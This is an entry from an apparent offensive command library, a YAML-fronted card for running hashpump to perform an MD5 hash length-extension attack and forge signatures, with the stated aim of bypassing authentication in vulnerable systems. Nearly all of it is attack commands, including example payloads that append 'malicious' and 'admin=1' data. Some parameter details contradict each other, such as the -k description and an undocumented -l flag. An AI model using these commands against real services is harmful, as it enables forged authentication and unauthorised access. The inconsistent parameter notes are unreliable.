---
id: cmd-hashpump-md5-extend
data: >-
  ./hashpump -s ORIGINAL_SIGNATURE -k KNOWN_LENGTH -p APPEND_PAYLOAD --digest
  md5
tags:
  - exploitation
  - crypto
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:11.129Z'
verified: false
validated: true
submitted: true
---
# hashpump-extend

## Command

```bash
./hashpump -s ORIGINAL_SIGNATURE -k KNOWN_LENGTH -p APPEND_PAYLOAD --digest md5
```

## Description

Uses Hashpump to perform a length-extension attack on MD5 hashes, generating an extended message and new signature for forging authentication in vulnerable systems like WP API Key-Auth.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s, --signature` | Original hex signature | Yes |
| `-k, --keylen` | Length of original message in bytes | Yes |
| `-p, --pad` | Payload to append | Yes |
| `--digest` | Hash algorithm (md5) | Yes |

## Examples

### Basic Usage

```bash
./hashpump -s 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d -k 50 -p '}{"malicious":true}' --digest md5
```

### Advanced Usage

```bash
./hashpump -s sig.hex -k 100 -p 'admin=1' -l 1024 --digest md5
```

## Expected Output

Original: ...
Extended: NEW_MESSAGE
Signature: NEW_SIGNATURE

## Related

- [[Related Procedure: Forge-Signature-with-MD5-Length-Extension]]
